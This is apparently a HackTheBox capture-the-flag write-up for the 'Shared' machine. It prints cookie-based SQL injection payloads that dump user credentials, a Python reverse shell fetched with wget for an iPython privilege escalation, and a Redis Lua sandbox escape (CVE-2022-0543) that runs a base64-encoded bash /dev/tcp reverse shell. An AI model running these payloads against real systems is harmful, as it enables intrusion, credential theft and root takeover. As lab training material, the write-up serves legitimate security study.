# HackTheBox - Shared

## NMAP

```bash

Nmap scan report for 10.10.11.172                                                                                                             
Host is up (0.17s latency).                                                                                                                   
Not shown: 997 closed ports                                                                                                                   
PORT    STATE SERVICE  VERSION                                                                                                                
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                                                          
80/tcp  open  http     nginx 1.18.0                                                                                                           
| http-methods:                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                  
|_http-server-header: nginx/1.18.0                                                                                                            
|_http-title: Did not follow redirect to http://shared.htb                                                                                    
443/tcp open  ssl/http nginx 1.18.0                                    
| http-methods:                    
|_  Supported Methods: GET HEAD POST OPTIONS                           
|_http-server-header: nginx/1.18.0                                     
|_http-title: Did not follow redirect to https://shared.htb                                                                                   
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US                                     
| Issuer: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US                                                
| Public Key type: rsa             
| Public Key bits: 2048            
| Signature Algorithm: sha256WithRSAEncryption                         
| Not valid before: 2022-03-20T13:37:14                                
| Not valid after:  2042-03-15T13:37:14                                
| MD5:   fb0b 4ab4 9ee7 d95d ae43 239a fca4 c59e                       
|_SHA-1: 6ccd a103 5d29 a441 0aa2 0e32 79c4 83e1 750a d0a0                                                                                    
| tls-alpn:                        

```

## PORT 80/443 (HTTP/HTTPS)

The webserver redirects to `shared.htb`, so let's add this on our hosts file

<img src="https://i.imgur.com/he05BZJ.png"/>

<img src="https://i.imgur.com/oJdxazw.png"/>

<img src="https://i.imgur.com/k7jOCNR.png"/>

This loads up the site and it displays a shopping site, checking the functionality of the site we can add items in the cart, few GET parameters can be seen which we can test for sql injection

<img src="https://i.imgur.com/fHVVXBX.png"/>

<img src="https://i.imgur.com/AM3dt79.png"/>

With `sqlmap` I test for sqli but it didn't seemed that if any of the parameters were vulnerable

<img src="https://i.imgur.com/RmlM9JL.png"/>

Continuing with the functionality of the site

<img src="https://i.imgur.com/kaJakik.png"/>

Clicking on proceed to checkout will redirect us to `checkout.shared.htb`

<img src="https://i.imgur.com/4cRlHAW.png"/>

I used `wfuzz` to see if there are any more subdomains that we can find but there was only the checkout subdomain

<img src="https://i.imgur.com/bxoaxjC.png"/>

<img src="https://i.imgur.com/bfS2VKC.png"/>

<img src="https://i.imgur.com/HL1rMe5.png"/>

The pay button doesn't make any request, it just displays a message with `alert`

<img src="https://i.imgur.com/t2KEJzL.png"/>

<img src="https://i.imgur.com/sFXW0mA.png"/>

Intercpeting the request when adding the the items in the cart it adds `custom_cart` in the cookies and this is used on checkout subdomain to display the items in the cart

<img src="https://i.imgur.com/lzlpTO6.png"/>

<img src="https://i.imgur.com/dBznmZf.png"/>

If we try changing the product code to a non-existent code it will show a message `Not found` in Product

<img src="https://i.imgur.com/PB863j1.png"/>

<img src="https://i.imgur.com/XIsNsH7.png"/>

So this could mean that maybe it's verifying the product code from the database, we can try sqli here with `' OR 1=1 -- ` and see if it is vulnerable

<img src="https://i.imgur.com/N5O2rZP.png"/>

<img src="https://i.imgur.com/Mwxws7m.png"/>

This returns a product code so this definately is vulnerable to sqli, we can now try to enumerate the number of columns with `ORDER BY` 

```sql
{"uwu'ORDER BY 2 -- ":"12"}
```
This gives the error `Not Found` which means we haven't got the correct number of columns 

<imgs src="https://i.imgur.com/wcmthmz.png"/>

On increasing it to 3 we'll get a blank response meaning that there are 3 columns in the current table

```sql
{"uwu'ORDER BY 3 -- ":"12"}
```

<img src="https://i.imgur.com/UxRsPU6.png"/>

To see which column gets refleced on the page 

```sql
{"'union select 'U','W','U' -- ":"12"}
```

<img src="https://i.imgur.com/XBCFdou.png"/>


We can now print the database version with `@@version` or `versionn()` to see what's being used  in the second column
```sql
{"'union select null,@@version,null -- ":"12"}
```


<img src="https://i.imgur.com/7gGQCBL.png"/>

I tried reading the files through `load_file` function but the database user didn't had the FILE privilege, we can enumerate the database name with `database()` which returns the name as `checkout`

```sql
{"'union select null,database(),null -- ":"12"}
```

<img src="https://i.imgur.com/nOuiNj2.png"/>

To enumerate the table and column name

```sql
{"'union select null,table_name,null from information_schema.tables where table_schema=database() -- ":"12"}
```

<img src="https://i.imgur.com/LYxS0sE.png"/>


## Foothold

But the table name shown is only one here and it could be that query behind the application is fetching only one record from the database which makes the output limited, we can make use of `group_concat` here

http://www.securityidiots.com/Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html

```sql
{"'union select null,group_concat(table_name),null from information_schema.tables where table_schema=database() -- ":"12"}
```

Which now returns another table `products`

<img src="https://i.imgur.com/pJMIuBR.png"/>

The same goes for the column names, if we try to dump coulmn_names without group_concat function it will only return one column

```sql
{"'union select null,column_name,null from information_schema.columns where table_schema=database() -- ":"12"}
```

<img src="https://i.imgur.com/VPQAD3B.png"/>

So with group_concat

```sql
{"'union select null,group_concat(column_name),null from information_schema.columns where table_schema=database() -- ":"12"}
```

<img src="https://i.imgur.com/Uwaw9J4.png"/>

Now we can extract the username and password from the table

```sql
{"'union select null,group_concat(username,0x3a,password),null from user -- ":"12"}
```

<img src="https://i.imgur.com/Cw7qWtK.png"/>


This hash can be cracked from crackstation site

https://crackstation.net/

<img src="https://i.imgur.com/F2IeK9t.png"/>

With these credentials we can login through ssh 

<img src="https://i.imgur.com/Evnkxgb.png"/>

From the output of `id` command we can see that this user is in `developer` group, we can get the credentials of database even tho there's no need for that but still the password can be re-used 

<img src="https://i.imgur.com/j0IS9v2.png"/>

Checking if the developer group is an owner of any folder or file

<img src="https://i.imgur.com/Lp1DE66.png"/>

Transferring `pspy` on the machine to see if there are any cronjobs runnning with the other user

<img src="https://i.imgur.com/Iqbai3L.png"/>


pspy shows that `ipython` as `dan_smith` 

<img src="https://i.imgur.com/7V4T2ZI.png"/>


https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x

## Privilege Escalation (dan_smith)


On looking for vulnerabilities for ipython took, there was a execution with unnecessary privileges `CVE-2022-21699` which runs the python script if it's in 
`/profile_default/startup/`

And ipython on the target machine is indeed vulnerable as it's using version 8.0.0

<img src="https://i.imgur.com/eLed623.png"/>

So first we'll host a python file having a reverse shell

```python
import socket
import os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.114",2222))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")

```

By following the proof of concept we need to make the startup directory in profile_default having our python

```bash
mkdir -p -m 777 /opt/scripts_review/profile_default && mkdir -p -m 777 /opt/scripts_review/profile_default/startup && cd /opt/scripts_review/profile_default/startup && wget 10.10.14.114:3333/foo.py && chmod 777 ./foo.py
```

<img src="https://i.imgur.com/Gsrrqug.png"/>

But the reverse shell will die because the cronjob kills the ipython process through which our reverse shell is spawned, so it's best to just get the ssh key


<img src="https://i.imgur.com/KgXjhJV.png"/>

<img src="https://i.imgur.com/cEOOAeX.png"/>


## Privilege Escalation (root)

This user is in `sysadmin` group also this has access to `redis_connector_dev`

<img src="https://i.imgur.com/FNbgGo4.png"/>

On runnning this binary it will connect to redis server using the hard coded credentials and will return the result of `INFO` command which returns the statistics of redis server

<img src="https://i.imgur.com/RXCELuk.png"/>

Doing same basic reverse engineering stuff with `strings` we can find out that it's a golang binary

<img src="https://i.imgur.com/Dw9uQfE.png"/>

We could try reversing this binary with `ghidra` but it's a pain when we try reversing golang binaries on ghidra, a better option is to `cutter`

https://github.com/rizinorg/cutter

<img src="https://i.imgur.com/u6pgNYF.png"/>

From here we can search for the main function

<img src="https://i.imgur.com/nHhrmRb.png"/>


In the main function we can see a string which might be the credential

<img src="https://i.imgur.com/oeJcpuX.png"/>

This can be checked without needing to reverse the binary, as the binary is making a connection to 127.0.0.1:6379, it's sending only the password not the username

<img src="https://i.imgur.com/ixGCCgu.png"/>

With this passowrd we can login into redis server with `redis-cli`

<img src="https://i.imgur.com/MesQUkW.png"/>

There's a CVE for redis which is Lua sandbox escape in which we can execute lua scripts to get code execution as root user as this redis is running with root

<img src="https://i.imgur.com/SEjB52v.png"/>

https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md

```lua
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

<img src="https://i.imgur.com/chtBUoq.png"/>

To get a root shell we can base64 encode our bash reverse shell, pipe it to base64 decode and then pipe it to bash so that it can be executed 

```bash

echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.114/2222 0>&1'" | base64 -w0

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExNC8yMjIyIDA+JjEnCg== | base64 -d | bash ", "r"); local res = f:read("*a"); f:close(); return res' 0

```

<img src="https://i.imgur.com/fLkfu77.png"/>

The redis process will also get killed and trying to make bash a SUID it won't allow you to do that

<img src="https://i.imgur.com/jQu82SJ.png"/>

I also tried writing the ssh public in root's authorized_keys file as well but that didn't worked so the last resort was to edit entry of root user in `shadow` file by first saving it on your local machine, editing and then transfer it back by hosting it through python server

<img src="https://i.imgur.com/UnvNbU7.png"/>

<img src="https://i.imgur.com/zdPTCmd.png"/>

## References

- http://www.securityidiots.com/Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html
- https://asheeshandotra1.blogspot.com/2018/05/sql-injection-attack.html
- https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x
- https://github.com/rizinorg/cutter
- https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md
